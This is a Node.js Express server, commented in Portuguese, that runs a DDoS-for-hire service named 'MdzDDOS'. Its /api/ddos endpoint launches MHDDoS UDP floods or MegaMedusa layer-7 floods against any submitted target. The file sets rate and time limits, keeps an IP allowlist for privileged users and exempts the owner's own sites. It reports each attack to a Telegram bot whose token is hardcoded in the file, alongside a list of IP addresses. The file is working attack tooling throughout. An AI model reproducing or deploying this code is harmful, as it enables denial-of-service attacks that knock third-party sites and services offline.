const express = require('express');
const { spawn } = require('child_process');
const axios = require('axios');
const cors = require('cors');
const app = express();

const PORT = 5000;
const TELEGRAM_BOT_TOKEN = '7982043542:AAEk_EWNp0OBgx4R9Ixzdrk07mUbif6sG9g';
const OWNER_CHAT_ID = '7071099929';

app.use(cors()); // Suporte CORS para todos os domínios

let runningProcesses = [];

// IPs com permissão para +60s
const IP_LIBERADOS = ['191.177.246.9', '191.246.247.110', '191.246.236.8', '135.148.98.233', '187.34.79.112', '66.70.233.129', '191.246.239.236', '138.122.60.30', '45.180.149.167', '187.34.79.112', '135.148.98.233'];
// IPs com acesso ao /api/stopvery
const IP_ADMIN = ['::ffff:138.122.60.30', '138.122.60.30'];
// Sites protegidos (para L7)
const SITES_BLOQUEADOS = ['https://mdzapis.com', 'https://primaryhost.shop'];

// Caminho completo para a pasta do MHDDoS
// ATENÇÃO: SUBSTITUA ESTE CAMINHO PELO CAMINHO REAL DO SEU MHDDoS!
const MHDDOS_PATH = '/root/MHDDoS'; // Exemplo: Se MHDDoS está em /root/MHDDoS/

app.set('trust proxy', true);

// Função para normalizar IP
function getRealIP(req) {
  return req.ip.replace('::ffff:', '');
}

// Iniciar ataque
app.get('/api/ddos', (req, res) => {
  const { site, rate, time, threads, method } = req.query;
  const ip = getRealIP(req);
  const agent = req.headers['user-agent'];

  if (!site || !rate || !time || !threads || !method) {
    return res.status(400).json({ error: 'Parâmetros obrigatórios: site, rate, time, threads, method' });
  }

  const jaTemAtaqueNoDominio = runningProcesses.some(p => p.site === site);
  if (jaTemAtaqueNoDominio) {
    return res.status(429).json({ error: `Já existe um ataque em execução para o domínio: ${site}.` });
  }

  if (!IP_LIBERADOS.includes(ip) && parseInt(time) > 120) {
    return res.status(403).json({ error: 'Tempo máximo permitido é 60 segundos para este IP.' });
  }
  if (!IP_LIBERADOS.includes(ip) && parseInt(threads) > 30) {
    return res.status(400).json({ error: 'Máximo de threads permitido é 30.' });
  }
  if (!IP_LIBERADOS.includes(ip) && parseInt(rate) > 30) {
    return res.status(400).json({ error: 'Máximo de rate permitido é 30.' });
  }

  let command;
  let args;
  let attackType = '';
  let options = {};

  switch (method.toLowerCase()) {
    case 'udp':
      const [targetIp, targetPort] = site.split(':');
      if (!targetIp || !targetPort) {
        return res.status(400).json({ error: 'Formato de site inválido para UDP. Use "ip:porta".' });
      }
      command = 'python3';
      // MHDDoS para UDP:
      // python3 start.py <method> <ip:port> <threads> <duration>
      args = [
        'start.py',
        'UDP',           // <method>
        `${targetIp}:${targetPort}`, // <ip:port>
        threads.toString(), // <threads> (usando o 'threads' do seu request)
        time.toString()    // <duration> (usando o 'time' do seu request)
      ];
      options = { cwd: MHDDOS_PATH };
      attackType = 'L4 (MDZ DDOS)';
      break;

    case 'l7':
      if (SITES_BLOQUEADOS.includes(site)) {
        return res.status(403).json({ error: 'Este site está protegido contra ataques.' });
      }
      command = 'node';
      args = ['MegaMedusa', site, time.toString(), rate.toString(), threads.toString(), 'proxy.txt'];
      attackType = 'L7 (MegaMedusa)';
      break;

    default:
      return res.status(400).json({ error: 'Método de ataque inválido. Use "udp" ou "l7".' });
  }

  const attack = spawn(command, args, options);

  attack.stdout.on('data', (data) => {
    const output = data.toString().replace(/MegaMedusa/g, 'MdzDDOS');
    process.stdout.write(`[MdzDDOS - STDOUT] ${output}`);
  });

  attack.stderr.on('data', (data) => {
    const error = data.toString().replace(/MegaMedusa/g, 'MdzDDOS');
    process.stderr.write(`[MdzDDOS - STDERR] ${error}`);
  });

  attack.on('close', (code) => {
    console.log(`[MdzDDOS] Processo ${attackType} finalizado com código ${code} (IP ${ip}, Site ${site})`);
    runningProcesses = runningProcesses.filter(p => p.process.pid !== attack.pid);
  });

  runningProcesses.push({ process: attack, ip, site });

  console.log(`?? Ataque ${attackType} iniciado por ${ip}:
?? Alvo: ${site}
⚙️ Rate: ${rate}
?? Threads: ${threads}
⏱️ Duração: ${time}s
?? PID: ${attack.pid}`);

  const msg = `
?? NOVO ATAQUE INICIADO
?? TIPO: ${attackType}
?? IP: ${ip}
?? User-Agent: ${agent}
?? Alvo: ${site}
⚙️ Rate: ${rate}
?? Threads: ${threads}
⏱️ Tempo: ${time}s
`.trim();

  axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    params: { chat_id: OWNER_CHAT_ID, text: msg }
  });

  res.json({ message: 'Ataque iniciado com sucesso!', site, rate, threads, time, method: attackType });
});

app.get('/api/stopall', (req, res) => {
  const ip = getRealIP(req);
  const processos = runningProcesses.filter(p => p.ip === ip);

  if (processos.length === 0) {
    return res.status(404).json({ error: 'Nenhum ataque em execução para este IP.' });
  }

  processos.forEach(p => {
    try {
      p.process.kill('SIGKILL');
      console.log(`[MdzDDOS] Processo PID ${p.process.pid} (Site: ${p.site}) encerrado por ${ip}.`);
    } catch (e) {
      console.error(`[MdzDDOS] Erro ao tentar encerrar processo PID ${p.process.pid}: ${e.message}`);
    }
  });

  runningProcesses = runningProcesses.filter(p => p.ip !== ip);
  res.json({ message: `Todos os ataques do IP ${ip} foram parados.` });
});

app.get('/api/stopvery', (req, res) => {
  const ip = getRealIP(req);
  if (!IP_ADMIN.includes(ip)) {
    return res.status(403).json({ error: 'Acesso negado.' });
  }

  runningProcesses.forEach(p => {
    try {
      p.process.kill('SIGKILL');
      console.log(`[MdzDDOS] Processo PID ${p.process.pid} (Site: ${p.site}) encerrado pelo administrador.`);
    } catch (e) {
      console.error(`[MdzDDOS] Erro ao tentar encerrar processo PID ${p.process.pid}: ${e.message}`);
    }
  });

  runningProcesses = [];
  res.json({ message: 'Todos os ataques foram parados pelo administrador.' });
});

app.listen(PORT, () => {
  console.log(`?? Servidor rodando na porta ${PORT}`);
});
